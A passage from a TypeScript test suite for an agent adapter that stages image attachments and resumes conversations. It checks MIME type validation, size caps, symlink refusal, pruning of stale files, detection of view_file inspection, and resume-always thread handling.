		const { spawns, turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c-only")], stdin: true }), {
			workdir,
			imageInput: true,
		});
		const result = await turn(req({ messages: [userMsg([imagePart(JPEG_BYTES, "image/jpeg")])] }, { sessionId: "s-only" }));
		const rel = stagedRel(JPEG_BYTES, "jpg");
		expect(result.stagedAttachments).toEqual([rel]);
		expect(result.prompt).toBe(
			`[Attached user image: ${rel}]\nPlease inspect each attached image above with view_file before responding.`,
		);
		expect(spawns).toHaveLength(1);
		expect(result.classification.outcome).toBe("success");
	});

	test("unsupported part (image + PDF) rejects all-or-nothing: TurnError names the type, nothing staged, no spawn", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-unsup-"));
		const { spawns, turn, req } = await setup(() => {
			throw new Error("must not spawn");
		}, { workdir, imageInput: true });
		const err = await catchTurnError(
			turn(
				req(
					{
						messages: [
							// Boundary cast (house precedent): pi's closed content union
							// has no `file` part, but a hostile/host payload can carry
							// one at runtime — the engine's open PromptPart accepts it.
							userMsg(
								[
									imagePart(PNG_BYTES_A),
									{ type: "file", data: b64(new Uint8Array([1, 2, 3])), mediaType: "application/pdf" },
								] as unknown as UserMessage["content"],
							),
						],
					},
					{ sessionId: "s-unsup" },
				),
			),
		);
		expect(err.mapping.finalize).toBe("error");
		expect(err.mapping.retryable).toBe(false);
		expect(err.mapping.message).toContain("application/pdf");
		expect(err.mapping.message).toMatch(/png, jpeg, gif and webp/);
		expect(spawns).toHaveLength(0);
		expect(existsSync(join(workdir, ".agy-attachments"))).toBe(false);
	});

	test("hostile mimeType on the image part itself is unsupported (threat 1)", async () => {
		const { spawns, turn, req } = await setup(() => {
			throw new Error("must not spawn");
		}, { imageInput: true });
		const err = await catchTurnError(
			turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A, "image/x-virus")])] }, { sessionId: "s-hostile" })),
		);
		expect(err.mapping.message).toContain("image/x-virus");
		expect(spawns).toHaveLength(0);
	});

	test("oversized image (>20 MB) rejects with the cap guidance before staging or spawn (threat 2)", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-big-"));
		const { spawns, turn, req } = await setup(() => {
			throw new Error("must not spawn");
		}, { workdir, imageInput: true });
		const huge = new Uint8Array(20 * 1024 * 1024 + 1);
		const err = await catchTurnError(
			turn(req({ messages: [userMsg([imagePart(huge)])] }, { sessionId: "s-big" })),
		);
		expect(err.mapping.message).toContain("20 MB");
		expect(spawns).toHaveLength(0);
		expect(existsSync(join(workdir, ".agy-attachments"))).toBe(false);
	});

	test("staging sweeps stale attachments (7-day window): aged hash-named entry pruned, fresh staging and unrelated files survive", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-prune-"));
		const dir = join(workdir, ".agy-attachments");
		mkdirSync(dir);
		writeFileSync(join(dir, "deadbeefdeadbeef.png"), "old");
		writeFileSync(join(dir, "not-a-staged-name.txt"), "foreign"); // never touched (foreign namespace)
		const aged = new Date(Date.now() - 8 * 24 * 60 * 60 * 1000);
		utimesSync(join(dir, "deadbeefdeadbeef.png"), aged, aged);
		const { turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c-prune")], stdin: true }), {
			workdir,
			imageInput: true,
		});
		await turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-prune" }));
		expect(existsSync(join(dir, "deadbeefdeadbeef.png"))).toBe(false);
		expect(existsSync(join(dir, "not-a-staged-name.txt"))).toBe(true);
		expect(existsSync(join(workdir, stagedRel(PNG_BYTES_A)))).toBe(true);
	});

	test("symlinked .agy-attachments dir refuses to stage: TurnError (never a raw engine error), no spawn (threat 3)", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-sym-"));
		const target = await mkdtemp(join(tmpdir(), "agy-pi-sym-target-"));
		symlinkSync(target, join(workdir, ".agy-attachments"));
		const { spawns, turn, req } = await setup(() => {
			throw new Error("must not spawn");
		}, { workdir, imageInput: true });
		const err = await catchTurnError(
			turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-sym" })),
		);
		expect(err.mapping.finalize).toBe("error");
		expect(err.mapping.message).toContain("symlink");
		expect(spawns).toHaveLength(0);
		expect(readdirSync(target)).toEqual([]); // nothing escaped the workdir
	});

	test("R7 re-seed: an EARLIER image turn renders the compact placeholder in the seeded prompt — never raw bytes", async () => {
		const { store, turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c-reseed")], stdin: true }), {
			imageInput: true,
		});
		await store.bind("s-reseed", "conv-stale", ["deadbeef"]); // forces divergence
		const secret = b64(PNG_BYTES_B);
		const context: Context = {
			systemPrompt: "SYS",
			messages: [userMsg([imagePart(PNG_BYTES_B)]), assistantMsg("old answer"), userMsg("new question")],
		};
		const result = await turn(req(context, { sessionId: "s-reseed" }));
		expect(result.diverged).toBe(true);
		expect(result.prompt).toContain("[user attached an image — not re-embedded]");
		expect(result.prompt).not.toContain(secret); // no raw payload re-embedded
		expect(result.prompt).toContain("new question");
	});
});

// --- pi-image-input R6: inspection tap (D7) + NDJSON fixture proof (design open Q) ---

/**
 * Fixture: packages/pi-adapter/tests/fixtures/agy-view-file-steps.ndjson
 *
 * Provenance (no agy binary exists in CI, so the fixture transcribes the
 * REAL-binary line shapes already recorded in-repo): the raw step_update
 * lines pinned in opencode-adapter/tests/language-model.test.ts (recorded
 * against the real binary) show agy emits tool steps as
 * {"step_update":{...,"tool_name":"view_file","tool_info":{"path":...}}}
 * — WITHOUT an `event` wrapper — while init/result lines carry `event`.
 * The engine's live-probe note (spawn.ts DEFAULT_STALL_MS evidence)
 * confirms the init → step_update… → result ordering.
 */
describe("pi-image-input R6: view_file tap matcher vs the recorded stream shape (task 3.4)", () => {
	const FIXTURE = join(import.meta.dir, "fixtures", "agy-view-file-steps.ndjson");
	const STAGED_BASENAME = "9f86d081884c7d21.png";

	test("every recorded view_file line satisfies the opencode raw-line matcher (includes view_file + staged basename where applicable)", () => {
		const lines = readFileSync(FIXTURE, "utf8").split("\n").filter((l) => l !== "");
		expect(lines.length).toBeGreaterThanOrEqual(6);
		const viewFileLines = lines.filter((l) => l.includes('"tool_name":"view_file"'));
		// The matcher's first conjunct holds for EVERY recorded view_file line.
		expect(viewFileLines.length).toBe(3);
		for (const line of viewFileLines) expect(line.includes("view_file")).toBe(true);
		// Second conjunct: the staged-name lines name the staged basename in
		// tool_info.path; the unrelated-path line does not.
		const staged = viewFileLines.filter((l) => l.includes(STAGED_BASENAME));
		expect(staged.length).toBe(2);
		expect(staged.every((l) => l.includes(`.agy-attachments/${STAGED_BASENAME}`))).toBe(true);
		const unrelated = viewFileLines.find((l) => l.includes("src/other.ts"));
		expect(unrelated?.includes(STAGED_BASENAME)).toBe(false);
		// pi-side tolerance: the tap's stepUpdateOf lookup (parsed["step_update"])
		// resolves the payload on the real-binary shape — no `event` key needed.
		for (const line of viewFileLines) {
			const parsed = JSON.parse(line) as Record<string, unknown>;
			const inner = parsed["step_update"] as Record<string, unknown> | undefined;
			expect(inner).toBeDefined();
			expect(inner?.["tool_name"]).toBe("view_file");
		}
	});
});

describe("pi-image-input R6: inspection tap tracks view_file on staged names (turn)", () => {
	/** Real-binary-shaped raw line for a tool step (no event wrapper). */
	const toolLine = (tool: string, path: string): string =>
		`{"step_update":{"conversation_id":"c-tap","step_index":1,"state":"ACTIVE","step_type":"tool","tool_name":"${tool}","tool_info":{"path":"${path}"}}}`;

	test("view_file naming the staged basename flips attachmentsInspected (real-binary raw shape)", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-tap-"));
		const rel = stagedRel(PNG_BYTES_A);
		const { turn, req } = await setup(
			() => fakeChild({ lines: [{ event: "init", conversation_id: "c-tap" }, SUCCESS("c-tap")], rawLines: [toolLine("view_file", rel)], stdin: true }),
			{ workdir, imageInput: true },
		);
		const result = await turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-tap1" }));
		expect(result.stagedAttachments).toEqual([rel]);
		expect(result.attachmentsInspected).toBe(true);
	});

	test("view_file on an UNRELATED path never flips; another tool on the staged path never flips (both conjuncts required)", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-tap2-"));
		const rel = stagedRel(PNG_BYTES_A);
		const { turn, req } = await setup(
			() =>
				fakeChild({
					lines: [{ event: "init", conversation_id: "c-tap2" }, SUCCESS("c-tap2")],
					rawLines: [toolLine("view_file", "src/other.ts"), toolLine("cat", rel)],
					stdin: true,
				}),
			{ workdir, imageInput: true },
		);
		const result = await turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-tap2" }));
		expect(result.attachmentsInspected).toBe(false);
	});

	test("pi's event-wrapped fixture shape ALSO flips the tap (shape tolerance both ways)", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-tap3-"));
		const rel = stagedRel(PNG_BYTES_A);
		const { turn, req } = await setup(
			() =>
				fakeChild({
					lines: [
						{ event: "init", conversation_id: "c-tap3" },
						{ event: "step_update", step_update: { step_type: "tool", state: "DONE", tool_name: "view_file", tool_info: { path: rel }, duration_seconds: 0.3 } },
						SUCCESS("c-tap3"),
					],
					stdin: true,
				}),
			{ workdir, imageInput: true },
		);
		const result = await turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-tap3" }));
		expect(result.attachmentsInspected).toBe(true);
	});

	test("nothing staged: attachmentsInspected is vacuously true with no stagedAttachments field", async () => {
		const { turn, req } = await setup();
		const result = await turn(req({ messages: [userMsg("text only")] }, { sessionId: "s-tap4" }));
		expect(result.stagedAttachments).toBeUndefined();
		expect(result.attachmentsInspected).toBe(true);
	});
});

// --- v0.3 R2/D3: the resume-always thread branch ------------------------------------

describe("unit: turn — resume-always thread branch (v0.3 R2, D3)", () => {
	test("resumeAlways + stored hash-less entry: resumes via --conversation, NO onDiverged/seed/notice, NO baseline write-back", async () => {
		const { store, spawns, turn, req, divergedCalls } = await setup();
		await store.bind("s-thread", "conv-old"); // hash-less thread row (v0.3 :ask shape)
		const result = await turn({ ...req({ messages: [userMsg("follow-up")] }, { sessionId: "s-thread" }), resumeAlways: true });
		expect(result.diverged).toBe(false);
		expect(divergedCalls()).toBe(0); // the divergence ladder NEVER runs on the thread path
		expect(result.resumed).toBe(true);
		expect(spawns[0].args[spawns[0].args.indexOf("--conversation") + 1]).toBe("conv-old");
		// Last-user-turn prompt only — no divergence seed of the prior thread.
		expect(result.prompt).toBe("follow-up");
		// No baseline write-back: the rebound row stays hash-less.
		expect(await store.getEntry("s-thread")).toEqual({ conversationId: "conv-1" });
	});

	test("resumeAlways + no entry: fresh conversation (no --conversation) bound hash-less", async () => {
		const { store, spawns, turn, req, divergedCalls } = await setup();
		const result = await turn({ ...req({ messages: [userMsg("first thread prompt")] }, { sessionId: "s-new-thread" }), resumeAlways: true });
		expect(result.diverged).toBe(false);
		expect(divergedCalls()).toBe(0);
		expect(spawns[0].args).not.toContain("--conversation");
		expect(result.prompt).toBe("first thread prompt");
		expect(await store.getEntry("s-new-thread")).toEqual({ conversationId: "conv-1" }); // absent hashes field
	});

	test("resumeAlways + timeout: resume-once fires per attempt and the rebound conversationId persists hash-less", async () => {
		let attempt = 0;
		let retries = 0;
		const { store, spawns, turn, req } = await setup(() =>
			++attempt === 1
				? fakeChild({ lines: [{ event: "init", conversation_id: "conv-1" }], exit: 124 })
				: fakeChild({ lines: [{ event: "init", conversation_id: "conv-2" }, SUCCESS("conv-2")], stdin: true }),
		);
		const result = await turn({
			...req({ messages: [userMsg("slow thread task")] }, { sessionId: "s-thread-timeout" }),
			resumeAlways: true,
			onRetry: () => retries++,
		});
		expect(spawns).toHaveLength(2);
		expect(retries).toBe(1); // v0.1 R8 resume-once machinery unchanged, now on the thread row
		expect(spawns[1].args[spawns[1].args.indexOf("--conversation") + 1]).toBe("conv-1");
		expect(result.classification.outcome).toBe("success");
		expect(result.conversationId).toBe("conv-2");
		expect(await store.getEntry("s-thread-timeout")).toEqual({ conversationId: "conv-2" }); // hash-less
	});

	test("resumeAlways + abort mid-run: the binding survives (tapped conversation bound hash-less), TurnAborted thrown", async () => {
		const controller = new AbortController();
		const { store, spawns, turn, req } = await setup(() =>
			fakeChild({ lines: [{ event: "init", conversation_id: "conv-thread-ab" }], hold: true, stdin: true }),
		);
		const p = turn({
			...req({ messages: [userMsg("q")] }, { sessionId: "s-thread-ab", signal: controller.signal }),
			resumeAlways: true,
		});
		setTimeout(() => controller.abort(), 25);
		await expect(p).rejects.toBeInstanceOf(TurnAborted);
		expect(spawns[0].child.killed).toBe(true);
		expect(await store.getEntry("s-thread-ab")).toEqual({ conversationId: "conv-thread-ab" }); // hash-less, survives
	});
});
